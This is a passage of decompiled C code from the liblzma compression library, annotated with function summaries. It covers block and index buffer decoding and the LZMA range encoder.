      local_168.tv_nsec._0_4_ = (uVar4 % 1000) * 1000000;
      local_168.tv_sec = (ulong)uVar4 / 1000;
      local_168.tv_nsec._4_4_ = 0;
      clock_gettime(param_1[0x8c],&local_158);
      local_168.tv_nsec = local_158.tv_nsec + local_168.tv_nsec;
      if (local_168.tv_nsec < 1000000000) {
        local_168.tv_sec = local_158.tv_sec + local_168.tv_sec;
      }
      else {
        local_168.tv_nsec = local_168.tv_nsec - 1000000000;
        local_168.tv_sec = local_158.tv_sec + local_168.tv_sec + 1;
      }
      bVar2 = true;
    }
    bVar11 = false;
    pthread_mutex_lock(__mutex);
LAB_0010dbe0:
    if (param_5 <= uVar10) goto LAB_0010dbff;
    while ((*(long *)(param_1 + 0x6e) == 0 || (param_1[100] <= param_1[0x62]))) {
LAB_0010dbff:
      cVar3 = lzma_outq_has_output(puVar1);
      while( true ) {
        if ((cVar3 != '\0') || (param_1[0x69] != 0)) goto LAB_0010dc60;
        if (bVar11) {
          uVar4 = 0x65;
          pthread_mutex_unlock(__mutex);
          goto LAB_0010dc80;
        }
        if (param_1[0x68] == 0) {
          pthread_cond_wait((pthread_cond_t *)(param_1 + 0x80),__mutex);
          goto LAB_0010dbe0;
        }
        iVar5 = pthread_cond_timedwait((pthread_cond_t *)(param_1 + 0x80),__mutex,&local_168);
        bVar11 = iVar5 != 0;
        if (uVar10 < param_5) break;
        cVar3 = lzma_outq_has_output(puVar1);
      }
    }
LAB_0010dc60:
    pthread_mutex_unlock(__mutex);
    if (bVar11) goto code_r0x0010dc71;
    goto LAB_0010d7f0;
  }
LAB_0010e1b8:
  uVar4 = 0;
  goto LAB_0010dc80;
code_r0x0010dc71:
  uVar4 = 0x65;
  goto LAB_0010dc80;
}



/**
 * @name  lzma_block_buffer_decode
 * @brief Single-call LZMA block decoding: validates params, creates temp decoder, runs with LZMA_FINISH, restores positions on failure.
 * @confidence 90%
 * @classification io
 * @address 0x0010ee80
 */

/* Performs single-call LZMA block decoding from input buffer to output buffer. Validates
   parameters, creates a temporary next_coder on the stack, initializes block decoder, runs decode
   with LZMA_FINISH action (3), and restores positions on failure. Returns LZMA_OK on success with
   all input consumed, or LZMA_DATA_ERROR/LZMA_BUF_ERROR otherwise. */

int lzma_block_buffer_decode
              (undefined8 param_1,undefined8 param_2,long param_3,ulong *param_4,ulong param_5,
              long param_6,ulong *param_7,ulong param_8)

{
  ulong uVar1;
  ulong uVar2;
  int iVar3;
  int iVar4;
  long in_FS_OFFSET;
  undefined1 local_98 [16];
  undefined1 local_88 [16];
  undefined1 local_78 [16];
  undefined1 local_68 [16];
  undefined1 local_58 [16];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_4 != (ulong *)0x0) {
    if ((param_3 == 0) && (iVar3 = 0xb, param_5 != *param_4)) goto LAB_0010efc3;
    if ((param_7 != (ulong *)0x0) && (*param_4 <= param_5)) {
      iVar3 = 0xb;
      if (param_6 == 0) {
        if (param_8 != *param_7) goto LAB_0010efc3;
      }
      else if (param_8 < *param_7) goto LAB_0010efc3;
      local_98 = ZEXT816(0xffffffffffffffff) << 0x40;
      local_88 = (undefined1  [16])0x0;
      local_78 = (undefined1  [16])0x0;
      local_68 = (undefined1  [16])0x0;
      local_58 = (undefined1  [16])0x0;
      iVar3 = lzma_block_decoder_init(local_98,param_2,param_1);
      if (iVar3 == 0) {
        uVar1 = *param_4;
        uVar2 = *param_7;
        iVar4 = (*(code *)local_88._8_8_)
                          (local_98._0_8_,param_2,param_3,param_4,param_5,param_6,param_7,param_8,3)
        ;
        if (iVar4 != 1) {
          if (iVar4 == 0) {
            iVar4 = (*param_4 != param_5) + 9;
          }
          *param_4 = uVar1;
          *param_7 = uVar2;
          iVar3 = iVar4;
        }
      }
      lzma_next_coder_end(local_98,param_2);
      goto LAB_0010efc3;
    }
  }
  iVar3 = 0xb;
LAB_0010efc3:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar3;
}



/**
 * @name  lzma_index_buffer_decode
 * @brief Single-call index decoding from buffer: validates params, initializes decoder, runs state machine, handles errors.
 * @confidence 90%
 * @classification io
 * @address 0x00110d10
 */

/* Decodes an LZMA index from a buffer in one call. Validates parameters, initializes an index, runs
   the index decoder state machine, and handles errors. Returns LZMA_OK(0), LZMA_MEM_ERROR(5),
   LZMA_PROG_ERROR(0xb), LZMA_DATA_ERROR(9), or LZMA_MEMLIMIT_ERROR(6). */

int lzma_index_buffer_decode
              (undefined8 *param_1,long *param_2,undefined8 param_3,long param_4,ulong *param_5,
              ulong param_6)

{
  ulong uVar1;
  int iVar2;
  long lVar3;
  long in_FS_OFFSET;
  undefined4 local_88 [2];
  long local_80;
  long local_78;
  undefined8 *local_70;
  undefined8 local_68;
  undefined8 local_50;
  undefined4 local_48;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if ((((param_1 == (undefined8 *)0x0) || (*param_1 = 0, param_2 == (long *)0x0)) || (param_4 == 0))
     || ((param_5 == (ulong *)0x0 || (param_6 < *param_5)))) {
    iVar2 = 0xb;
  }
  else {
    lVar3 = *param_2;
    local_70 = param_1;
    local_78 = lzma_index_init(param_3);
    if (local_78 == 0) {
      iVar2 = 5;
    }
    else {
      if (lVar3 == 0) {
        lVar3 = 1;
      }
      local_88[0] = 0;
      uVar1 = *param_5;
      local_68 = 0;
      local_50 = 0;
      local_48 = 0;
      local_80 = lVar3;
      iVar2 = lzma_index_decoder_run(local_88,param_3,param_4,param_5,param_6,0,0,0,0);
      if (iVar2 == 1) {
        iVar2 = 0;
      }
      else {
        lzma_index_end(local_78,param_3);
        *param_5 = uVar1;
        if (iVar2 == 0) {
          iVar2 = 9;
        }
        else if (iVar2 == 6) {
          lVar3 = lzma_index_memusage(1,local_68);
          *param_2 = lVar3;
        }
      }
    }
  }
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return iVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_lzma_encoder_encode
 * @brief LZMA range encoder output function. Encodes literals/matches/reps via range coding with probability-based bit encoding. Manages range normalization, carry propagation, distance/length encoding, EOS marker.
 * @confidence 85%
 * @classification io
 * @address 0x00118c60
 */

/* LZMA range encoder output function. Encodes symbols (literals, matches, rep matches) using range
   coding with probability-based bit encoding. Manages range normalization, carry propagation,
   encodes match distances/lengths via bit trees, handles end-of-stream marker. Coordinates match
   finding and range encoding phases. */

undefined8
lzma_encode(ulong *param_1,long *param_2,long param_3,long *param_4,long param_5,uint param_6)

{
  ulong *puVar1;
  char cVar2;
  byte bVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  long lVar6;
  uint uVar7;
  uint uVar8;
  undefined8 uVar9;
  long lVar10;
  ulong uVar11;
  ulong uVar12;
  ulong uVar13;
  ulong uVar14;
  ulong uVar15;
  int iVar16;
  int iVar17;
  ulong uVar18;
  uint uVar19;
  uint uVar20;
  ulong uVar21;
  int *piVar22;
  uint uVar23;
  uint uVar24;
  long lVar25;
  long in_FS_OFFSET;
  uint local_48;
  uint local_44;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if (*(char *)((long)param_1 + 0xb75) == '\0') {
    if ((int)param_2[3] != (int)param_2[4]) {
      (*(code *)param_2[7])(param_2,1);
      uVar14 = param_1[4];
      uVar19 = 1;
      *(undefined4 *)((long)param_2 + 0x1c) = 0;
      iVar17 = 8;
      *(undefined4 *)((long)param_1 + uVar14 * 4 + 0x30) = 0;
      lVar10 = uVar14 + 2;
      param_1[uVar14 + 0x21] = (long)param_1 + 0x6b84;
      param_1[4] = uVar14 + 1;
      bVar3 = *(byte *)*param_2;
      do {
        iVar17 = iVar17 - 1;
        uVar18 = (ulong)uVar19;
        uVar23 = bVar3 >> ((byte)iVar17 & 0x1f) & 1;
        *(uint *)((long)param_1 + lVar10 * 4 + 0x2c) = uVar23;
        uVar19 = uVar23 + uVar19 * 2;
        param_1[lVar10 + 0x20] = (long)param_1 + uVar18 * 2 + 0xb84;
        lVar10 = lVar10 + 1;
      } while (iVar17 != 0);
      uVar14 = uVar14 + 9;
      param_1[0x56] = param_1[0x56] + 1;
      param_1[4] = uVar14;
LAB_00119199:
      *(undefined1 *)((long)param_1 + 0xb75) = 1;
      goto LAB_00118cab;
    }
    if ((int)param_2[0xd] != 0) {
      uVar14 = param_1[4];
      goto LAB_00119199;
    }
  }
  else {
    uVar14 = param_1[4];
LAB_00118cab:
    uVar18 = param_1[5];
    if (uVar18 < uVar14) {
      uVar19 = (uint)param_1[2];
      while( true ) {
        uVar18 = uVar18 + 1;
        if (uVar19 < 0x1000000) {
          uVar11 = *param_1;
          if (((uint)uVar11 < 0xff000000) || (uVar11 >> 0x20 != 0)) {
            lVar10 = *param_4;
            do {
              if (param_5 == lVar10) goto LAB_00118d78;
              cVar2 = *(char *)((long)param_1 + 0x14);
              param_1[3] = param_1[3] + 1;
              *(undefined1 *)((long)param_1 + 0x14) = 0xff;
              *(char *)(param_3 + lVar10) = cVar2 + (char)(uVar11 >> 0x20);
              lVar10 = lVar10 + 1;
              puVar1 = param_1 + 1;
              *puVar1 = *puVar1 - 1;
              uVar12 = *puVar1;
              *param_4 = lVar10;
            } while (uVar12 != 0);
            *(char *)((long)param_1 + 0x14) = (char)(uVar11 >> 0x18);
            uVar12 = 1;
          }
          else {
            uVar12 = param_1[1] + 1;
          }
          param_1[1] = uVar12;
          *(uint *)(param_1 + 2) = uVar19 << 8;
          *param_1 = (uVar11 & 0xffffff) << 8;
        }
        if (*(uint *)((long)param_1 + uVar18 * 4 + 0x2c) < 5) {
                    /* WARNING: Could not recover jumptable at 0x00118cf2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
          uVar9 = (*(code *)(&DAT_00128c5c +
                            *(int *)(&DAT_00128c5c +
                                    (ulong)*(uint *)((long)param_1 + uVar18 * 4 + 0x2c) * 4)))();
          return uVar9;
        }
        param_1[5] = uVar18;
        if (uVar18 == uVar14) break;
        uVar19 = (uint)param_1[2];
      }
    }
    param_1[4] = 0;
    uVar9 = 1;
    param_1[5] = 0;
    if (*(char *)((long)param_1 + 0xb76) != '\0') goto LAB_00118d7a;
    while( true ) {
      if ((param_6 != 0xffffffff) &&
         ((param_6 <= *(uint *)(param_2 + 3) - *(int *)((long)param_2 + 0x1c) ||
          (0xeffe < *param_4 + 4 + param_1[1])))) goto LAB_0011929a;
      if (*(uint *)(param_2 + 3) < *(uint *)(param_2 + 4)) goto LAB_00118e33;
      if ((int)param_2[0xd] == 0) break;
      if (*(int *)((long)param_2 + 0x1c) == 0) goto LAB_0011929a;
LAB_00118e33:
      if (*(char *)((long)param_1 + 0xb74) == '\0') {
        lzma_optimal_match(param_1,param_2,&local_44,&local_48,(int)param_1[0x56]);
      }
      else {
        find_match_or_literal(param_1,param_2,&local_44,&local_48,0x800);
      }
      uVar23 = local_48;
      uVar18 = param_1[0x56];
      uVar19 = (uint)param_1[0x59];
      uVar7 = (uint)param_1[0x16f] & (uint)uVar18;
      uVar12 = (ulong)uVar7;
      uVar11 = param_1[4];
      lVar10 = (uVar12 + 0x35c2 + (ulong)uVar19 * 0x10) * 2;
      uVar14 = (long)param_1 + lVar10;
      if (local_44 == 0xffffffff) {
        lVar6 = param_2[3];
        iVar17 = *(int *)((long)param_2 + 0x1c);
        *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x30) = 0;
        param_1[uVar11 + 0x21] = uVar14;
        param_1[4] = uVar11 + 1;
        lVar10 = *param_2;
        uVar7 = (int)lVar6 - iVar17;
        bVar3 = *(byte *)(lVar10 + (ulong)uVar7);
        lVar25 = (ulong)((((uint)uVar18 * 0x100 + (uint)*(byte *)(lVar10 + (ulong)(uVar7 - 1)) &
                          (uint)param_1[0x170]) <<
                         ((byte)*(undefined4 *)((long)param_1 + 0xb7c) & 0x1f)) * 3) * 2 + 0xb84;
        if (uVar19 < 7) {
          iVar16 = uVar19 - 3;
          if (uVar19 < 4) {
            iVar16 = 0;
          }
          lVar10 = uVar11 + 2;
          uVar19 = 1;
          *(int *)(param_1 + 0x59) = iVar16;
          iVar16 = 8;
          do {
            iVar16 = iVar16 - 1;
            uVar14 = (ulong)uVar19;
            uVar7 = bVar3 >> ((byte)iVar16 & 0x1f) & 1;
            *(uint *)((long)param_1 + lVar10 * 4 + 0x2c) = uVar7;
            uVar19 = uVar7 + uVar19 * 2;
            param_1[lVar10 + 0x20] = (long)param_1 + uVar14 * 2 + lVar25;
            lVar10 = lVar10 + 1;
          } while (iVar16 != 0);
          param_1[4] = uVar11 + 9;
        }
        else {
          iVar16 = uVar19 - 6;
          if (uVar19 < 10) {
            iVar16 = uVar19 - 3;
          }
          *(int *)(param_1 + 0x59) = iVar16;
          uVar19 = (uint)*(byte *)(lVar10 + (ulong)(uint)((((int)lVar6 - 1) - iVar17) -
                                                         *(int *)((long)param_1 + 0x2cc)));
          uVar8 = 0x100;
          uVar14 = uVar11 + 2;
          uVar7 = bVar3 + 0x100;
          do {
            uVar18 = uVar14;
            uVar19 = uVar19 * 2;
            uVar20 = uVar7 * 2;
            *(uint *)((long)param_1 + uVar18 * 4 + 0x2c) = uVar7 >> 7 & 1;
            param_1[uVar18 + 0x20] =
                 (long)param_1 + (ulong)((uVar19 & uVar8) + (uVar7 >> 8) + uVar8) * 2 + lVar25;
            uVar8 = uVar8 & ~(uVar19 ^ uVar20);
            uVar14 = uVar18 + 1;
            uVar7 = uVar20;
          } while (uVar20 < 0x10000);
          param_1[4] = uVar18;
        }
      }
      else {
        *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x30) = 1;
        param_1[uVar11 + 0x21] = uVar14;
        param_1[4] = uVar11 + 1;
        lVar25 = (ulong)uVar19 * 2;
        uVar14 = (long)param_1 + lVar25 + 0x6d04;
        if (local_44 < 4) {
          *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x34) = 1;
          param_1[uVar11 + 0x22] = uVar14;
          param_1[4] = uVar11 + 2;
          uVar14 = (long)param_1 + lVar25 + 0x6d1c;
          if (local_44 == 0) {
            *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x38) = 0;
            param_1[uVar11 + 0x23] = uVar14;
            *(uint *)((long)param_1 + uVar11 * 4 + 0x3c) = (uint)(local_48 != 1);
            param_1[uVar11 + 0x24] = (long)param_1 + lVar10 + 0x1e0;
            param_1[4] = uVar11 + 4;
          }
          else {
            uVar5 = *(undefined4 *)((long)param_1 + (ulong)local_44 * 4 + 0x2cc);
            *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x38) = 1;
            param_1[uVar11 + 0x23] = uVar14;
            param_1[4] = uVar11 + 3;
            uVar14 = (long)param_1 + lVar25 + 0x6d34;
            if (local_44 == 1) {
              *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x3c) = 0;
              param_1[uVar11 + 0x24] = uVar14;
              param_1[4] = uVar11 + 4;
            }
            else {
              *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x3c) = 1;
              param_1[uVar11 + 0x24] = uVar14;
              *(uint *)((long)param_1 + uVar11 * 4 + 0x40) = local_44 - 2;
              param_1[uVar11 + 0x25] = (long)param_1 + lVar25 + 0x6d4c;
              param_1[4] = uVar11 + 5;
              if (local_44 == 3) {
                *(undefined4 *)(param_1 + 0x5b) = *(undefined4 *)((long)param_1 + 0x2d4);
              }
              *(int *)((long)param_1 + 0x2d4) = (int)param_1[0x5a];
            }
            uVar4 = *(undefined4 *)((long)param_1 + 0x2cc);
            *(undefined4 *)((long)param_1 + 0x2cc) = uVar5;
            *(undefined4 *)(param_1 + 0x5a) = uVar4;
          }
          if (local_48 == 1) {
            iVar17 = *(int *)((long)param_2 + 0x1c);
            *(uint *)(param_1 + 0x59) = (-(uint)(uVar19 < 7) & 0xfffffffe) + 0xb;
          }
          else {
            cVar2 = *(char *)((long)param_1 + 0xb74);
            uVar14 = param_1[4];
            puVar1 = param_1 + 0x1746;
            if (local_48 - 2 < 8) {
              *(undefined4 *)((long)param_1 + uVar14 * 4 + 0x30) = 0;
              lVar10 = uVar14 + 2;
              uVar18 = 1;
              param_1[uVar14 + 0x21] = (ulong)puVar1;
              iVar17 = 3;
              do {
                iVar17 = iVar17 - 1;
                lVar25 = uVar18 * 2;
                uVar8 = local_48 - 2 >> ((byte)iVar17 & 0x1f) & 1;
                *(uint *)((long)param_1 + lVar10 * 4 + 0x2c) = uVar8;
                uVar18 = (ulong)(uVar8 + (int)uVar18 * 2);
                param_1[lVar10 + 0x20] = uVar12 * 0x10 + 4 + lVar25 + (long)puVar1;
                lVar10 = lVar10 + 1;
              } while (iVar17 != 0);
              param_1[4] = uVar14 + 4;
            }
            else {
              *(undefined4 *)((long)param_1 + uVar14 * 4 + 0x30) = 1;
              param_1[uVar14 + 0x21] = (ulong)puVar1;
              param_1[4] = uVar14 + 1;
              if (local_48 - 10 < 8) {
                *(undefined4 *)((long)param_1 + uVar14 * 4 + 0x34) = 0;
                uVar18 = 1;
                lVar10 = uVar14 + 3;
                param_1[uVar14 + 0x22] = (long)param_1 + 0xba32U;
                iVar17 = 3;
                do {
                  iVar17 = iVar17 - 1;
                  lVar25 = uVar18 * 2;
                  uVar8 = local_48 - 10 >> ((byte)iVar17 & 0x1f) & 1;
                  *(uint *)((long)param_1 + lVar10 * 4 + 0x2c) = uVar8;
                  uVar18 = (ulong)(uVar8 + (int)uVar18 * 2);
                  param_1[lVar10 + 0x20] = uVar12 * 0x10 + 0x104 + lVar25 + (long)puVar1;
                  lVar10 = lVar10 + 1;
                } while (iVar17 != 0);
                param_1[4] = uVar14 + 5;
              }
              else {
                *(undefined4 *)((long)param_1 + uVar14 * 4 + 0x34) = 1;
                uVar18 = 1;
                param_1[uVar14 + 0x22] = (long)param_1 + 0xba32U;
                lVar10 = uVar14 + 3;
                iVar17 = 8;
                do {
                  iVar17 = iVar17 - 1;
                  lVar25 = uVar18 * 2;
                  uVar8 = local_48 - 0x12 >> ((byte)iVar17 & 0x1f) & 1;
                  *(uint *)((long)param_1 + lVar10 * 4 + 0x2c) = uVar8;
                  uVar18 = (ulong)(uVar8 + (int)uVar18 * 2);
                  param_1[lVar10 + 0x20] = (long)param_1 + lVar25 + 0xbc34;
                  lVar10 = lVar10 + 1;
                } while (iVar17 != 0);
                param_1[4] = uVar14 + 10;
              }
            }
            if (cVar2 == '\0') {
              piVar22 = (int *)((long)param_1 + uVar12 * 4 + 0x10238);
              *piVar22 = *piVar22 - 1;
              if (*piVar22 == 0) {
                lzma_literal_price_init(puVar1,uVar7);
                uVar19 = (uint)param_1[0x59];
              }
            }
            iVar17 = *(int *)((long)param_2 + 0x1c);
            *(uint *)(param_1 + 0x59) = (-(uint)(uVar19 < 7) & 0xfffffffd) + 0xb;
          }
        }
        else {
          uVar8 = local_44 - 4;
          *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x34) = 0;
          param_1[uVar11 + 0x22] = uVar14;
          puVar1 = param_1 + 0xe3d;
          param_1[4] = uVar11 + 2;
          *(uint *)(param_1 + 0x59) = (-(uint)(uVar19 < 7) & 0xfffffffd) + 10;
          cVar2 = *(char *)((long)param_1 + 0xb74);
          if (local_48 - 2 < 8) {
            *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x38) = 0;
            uVar19 = 1;
            lVar10 = uVar11 + 4;
            param_1[uVar11 + 0x23] = (ulong)puVar1;
            iVar17 = 3;
            do {
              uVar14 = (ulong)uVar19;
              iVar17 = iVar17 - 1;
              uVar20 = local_48 - 2 >> ((byte)iVar17 & 0x1f) & 1;
              *(uint *)((long)param_1 + lVar10 * 4 + 0x2c) = uVar20;
              uVar19 = uVar20 + uVar19 * 2;
              param_1[lVar10 + 0x20] = uVar12 * 0x10 + 4 + uVar14 * 2 + (long)puVar1;
              lVar10 = lVar10 + 1;
            } while (iVar17 != 0);
            param_1[4] = uVar11 + 6;
          }
          else {
            *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x38) = 1;
            param_1[uVar11 + 0x23] = (ulong)puVar1;
            param_1[4] = uVar11 + 3;
            if (local_48 - 10 < 8) {
              *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x3c) = 0;
              uVar19 = 1;
              lVar10 = uVar11 + 5;
              param_1[uVar11 + 0x24] = (long)param_1 + 0x71eaU;
              iVar17 = 3;
              do {
                uVar14 = (ulong)uVar19;
                iVar17 = iVar17 - 1;
                uVar20 = local_48 - 10 >> ((byte)iVar17 & 0x1f) & 1;
                *(uint *)((long)param_1 + lVar10 * 4 + 0x2c) = uVar20;
                uVar19 = uVar20 + uVar19 * 2;
                param_1[lVar10 + 0x20] = uVar12 * 0x10 + 0x104 + uVar14 * 2 + (long)puVar1;
                lVar10 = lVar10 + 1;
              } while (iVar17 != 0);
              param_1[4] = uVar11 + 7;
            }
            else {
              *(undefined4 *)((long)param_1 + uVar11 * 4 + 0x3c) = 1;
              uVar19 = 1;
              param_1[uVar11 + 0x24] = (long)param_1 + 0x71eaU;
              lVar10 = uVar11 + 5;
              iVar17 = 8;
              do {
                iVar17 = iVar17 - 1;
                uVar14 = (ulong)uVar19;
                uVar20 = local_48 - 0x12 >> ((byte)iVar17 & 0x1f) & 1;
                *(uint *)((long)param_1 + lVar10 * 4 + 0x2c) = uVar20;
                uVar19 = uVar20 + uVar19 * 2;
                param_1[lVar10 + 0x20] = (long)param_1 + uVar14 * 2 + 0x73ec;
                lVar10 = lVar10 + 1;
              } while (iVar17 != 0);
              param_1[4] = uVar11 + 0xc;
            }
          }
          if (cVar2 == '\0') {
            piVar22 = (int *)((long)param_1 + uVar12 * 4 + 0xb9f0);
            *piVar22 = *piVar22 - 1;
            if (*piVar22 == 0) {
              lzma_literal_price_init(puVar1,uVar7);
            }
          }
          if (uVar8 < 0x2000) {
            uVar19 = (uint)(byte)(&dist_slot_log2_table)[uVar8];
          }
          else if (uVar8 < 0x2000000) {
            uVar19 = (byte)(&dist_slot_log2_table)[uVar8 >> 0xc] + 0x18;
          }
          else {
            uVar19 = (byte)(&dist_slot_log2_table)[uVar8 >> 0x18] + 0x30;
          }
          uVar14 = param_1[4];
          uVar18 = 1;
          uVar7 = 5;
          if (uVar23 < 6) {
            uVar7 = uVar23;
          }
          uVar11 = uVar14;
          do {
            lVar10 = uVar18 * 2;
            uVar20 = uVar19 >> (((char)uVar14 + '\x05') - (char)uVar11 & 0x1fU) & 1;
            *(uint *)((long)param_1 + uVar11 * 4 + 0x30) = uVar20;
            uVar18 = (ulong)(uVar20 + (int)uVar18 * 2);
            param_1[uVar11 + 0x21] = (ulong)(uVar7 - 2) * 0x80 + 0x6ee4 + lVar10 + (long)param_1;
            uVar11 = uVar11 + 1;
          } while (uVar11 != uVar14 + 6);
          param_1[4] = uVar11;
          if (3 < uVar19) {
            uVar24 = uVar19 >> 1;
            uVar20 = (uVar19 & 1 | 2) << ((char)uVar24 - 1U & 0x1f);
            uVar7 = uVar8 - uVar20;
            if (uVar19 < 0xe) {
              uVar18 = 1;
              lVar10 = uVar14 + 7;
              do {
                lVar25 = uVar18 * 2;
                *(uint *)((long)param_1 + lVar10 * 4 + 0x2c) = uVar7 & 1;
                uVar18 = (ulong)((uVar7 & 1) + (int)uVar18 * 2);
                param_1[lVar10 + 0x20] =
                     (long)param_1 + ((ulong)uVar20 - (ulong)uVar19) * 2 + lVar25 + 0x70e2;
                lVar10 = lVar10 + 1;
                uVar7 = uVar7 >> 1;
              } while (uVar14 + 8 + (ulong)(uVar24 - 2) != lVar10);
              param_1[4] = uVar14 + 7 + (ulong)(uVar24 - 2);
            }
            else {
              iVar17 = uVar24 - 5;
              piVar22 = (int *)((long)param_1 + uVar14 * 4 + 0x48);
              do {
                iVar17 = iVar17 - 1;
                *piVar22 = ((uVar7 >> 4) >> ((byte)iVar17 & 0x1f) & 1) + 2;
                piVar22 = piVar22 + 1;
              } while (iVar17 != 0);
              uVar19 = 1;
              lVar25 = uVar14 + 6 + (ulong)(uVar24 - 6);
              lVar10 = lVar25 + 2;
              uVar7 = uVar7 & 0xf;
              do {
                uVar14 = (ulong)uVar19;
                *(uint *)((long)param_1 + lVar10 * 4 + 0x2c) = uVar7 & 1;
                uVar19 = (uVar7 & 1) + uVar19 * 2;
                param_1[lVar10 + 0x20] = (long)param_1 + uVar14 * 2 + 0x71c8;
                lVar10 = lVar10 + 1;
                uVar7 = uVar7 >> 1;
              } while (lVar25 + 6 != lVar10);
              *(int *)(param_1 + 0x21d8) = (int)param_1[0x21d8] + 1;
              param_1[4] = lVar25 + 5;
            }
          }
          *(int *)((long)param_1 + 0x10e7c) = *(int *)((long)param_1 + 0x10e7c) + 1;
          iVar17 = *(int *)((long)param_2 + 0x1c);
          *(undefined4 *)(param_1 + 0x5b) = *(undefined4 *)((long)param_1 + 0x2d4);
          *(int *)((long)param_1 + 0x2d4) = (int)param_1[0x5a];
          uVar5 = *(undefined4 *)((long)param_1 + 0x2cc);
          *(uint *)((long)param_1 + 0x2cc) = uVar8;
          *(undefined4 *)(param_1 + 0x5a) = uVar5;
        }
      }
      uVar14 = param_1[0x57];
      uVar18 = param_1[5];
      *(uint *)((long)param_2 + 0x1c) = iVar17 - uVar23;
      if (uVar14 != 0) {
        uVar11 = *param_1;
        uVar12 = param_1[1];
        uVar19 = (uint)param_1[2];
        uVar15 = param_1[3];
        uVar21 = uVar18;
        while( true ) {
          if (uVar19 < 0x1000000) {
            if (((uint)uVar11 < 0xff000000) || (uVar11 >> 0x20 != 0)) {
              uVar12 = uVar15 + uVar12;
              do {
                if (uVar14 == uVar15) goto LAB_00119292;
                uVar15 = uVar15 + 1;
              } while (uVar15 != uVar12);
              uVar12 = 1;
            }
            else {
              uVar12 = uVar12 + 1;
            }
            uVar19 = uVar19 << 8;
            uVar11 = (uVar11 & 0xffffff) << 8;
            uVar13 = param_1[4];
          }
          else {
            uVar13 = param_1[4];
          }
          if (uVar13 == uVar21) break;
          uVar23 = *(uint *)((long)param_1 + uVar21 * 4 + 0x30);
          if (uVar23 == 2) {
            uVar19 = uVar19 >> 1;
          }
          else if (uVar23 < 3) {
            if (uVar23 == 0) {
              uVar19 = (uVar19 >> 0xb) * (uint)*(ushort *)param_1[uVar21 + 0x21];
            }
            else {
              uVar23 = (uint)*(ushort *)param_1[uVar21 + 0x21] * (uVar19 >> 0xb);
              uVar19 = uVar19 - uVar23;
              uVar11 = uVar11 + uVar23;
            }
          }
          else if (uVar23 == 3) {
            uVar19 = uVar19 >> 1;
            uVar11 = uVar11 + uVar19;
          }
          uVar21 = uVar21 + 1;
        }
        lVar10 = 5;
        if ((uint)uVar11 < 0xff000000) goto LAB_00119275;
        do {
          if (uVar11 >> 0x20 != 0) goto LAB_00119275;
          uVar12 = uVar12 + 1;
          while( true ) {
            uVar13 = uVar11 << 8;
            uVar11 = uVar13 & 0xffffffff;
            lVar10 = lVar10 - 1;
            if (lVar10 == 0) goto LAB_0011936c;
            if (0xfeffffff < (uint)uVar13) break;
LAB_00119275:
            uVar12 = uVar12 + uVar15;
            do {
              if (uVar14 == uVar15) goto LAB_00119292;
              uVar15 = uVar15 + 1;
            } while (uVar15 != uVar12);
            uVar12 = 1;
          }
        } while( true );
      }
      uVar21 = param_1[4];
LAB_0011936c:
      param_1[0x56] = param_1[0x56] + (ulong)local_48;
      if (uVar18 < uVar21) {
        uVar19 = (uint)param_1[2];
        while( true ) {
          uVar18 = uVar18 + 1;
          if (uVar19 < 0x1000000) {
            uVar14 = *param_1;
            if (((uint)uVar14 < 0xff000000) || (uVar14 >> 0x20 != 0)) {
              lVar10 = *param_4;
              do {
                if (param_5 == lVar10) goto LAB_00118d78;
                cVar2 = *(char *)((long)param_1 + 0x14);
                *(undefined1 *)((long)param_1 + 0x14) = 0xff;
                param_1[3] = param_1[3] + 1;
                *(char *)(param_3 + lVar10) = cVar2 + (char)(uVar14 >> 0x20);
                lVar10 = lVar10 + 1;
                puVar1 = param_1 + 1;
                *puVar1 = *puVar1 - 1;
                uVar11 = *puVar1;
                *param_4 = lVar10;
              } while (uVar11 != 0);
              *(char *)((long)param_1 + 0x14) = (char)(uVar14 >> 0x18);
              uVar11 = 1;
            }
            else {
              uVar11 = param_1[1] + 1;
            }
            param_1[1] = uVar11;
            *(uint *)(param_1 + 2) = uVar19 << 8;
            *param_1 = (uVar14 & 0xffffff) << 8;
          }
          if (*(uint *)((long)param_1 + uVar18 * 4 + 0x2c) < 5) {
                    /* WARNING: Could not recover jumptable at 0x001193b1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
            uVar9 = (*(code *)(&DAT_00128c84 +
                              *(int *)(&DAT_00128c84 +
                                      (ulong)*(uint *)((long)param_1 + uVar18 * 4 + 0x2c) * 4)))();
            return uVar9;
          }
          param_1[5] = uVar18;
          if (uVar18 == uVar21) break;
          uVar19 = (uint)param_1[2];
        }
      }
      param_1[4] = 0;
      param_1[5] = 0;
    }
  }
LAB_00118d78:
  uVar9 = 0;
LAB_00118d7a:
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar9;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
LAB_00119292:
  param_1[4] = 0;
LAB_0011929a:
  if ((ulong *)param_1[0x58] != (ulong *)0x0) {
    *(ulong *)param_1[0x58] = param_1[0x56];
  }
  uVar14 = param_1[4];
  if (*(char *)((long)param_1 + 0xb77) != '\0') {
    uVar19 = (uint)param_1[0x59];
    uVar18 = param_1[0x56];
    uVar11 = param_1[0x16f];
    *(undefined4 *)((long)param_1 + uVar14 * 4 + 0x30) = 1;
    uVar12 = (ulong)((uint)uVar18 & (uint)uVar11);
